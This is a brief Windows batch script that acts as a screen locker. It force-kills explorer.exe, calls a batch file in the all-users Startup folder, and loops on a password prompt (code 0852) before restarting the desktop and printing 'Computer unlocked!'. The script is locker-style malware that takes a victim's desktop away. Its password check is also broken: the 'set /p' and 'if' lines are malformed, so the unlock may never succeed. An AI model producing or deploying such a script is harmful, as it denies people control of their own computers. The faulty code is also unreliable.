@echo off 
chcp 65001 
set password=0852 
%ALLUSERSPROFILE%\Start Menu\Programs\Startup\driver.bat
taskkill /f /im "explorer.exe" 
cls 
:b 
set password=0852 
echo "Tries: 1"
echo "Send password:" 
set /p %password%= 
if %password%="0852" goto :o 
goto b 
:o 
cls 
start "explorer.exe" 
cls 
echo. 
echo. 
echo "Computer unlocked!" 
timeout /t 999 >nul 
exit

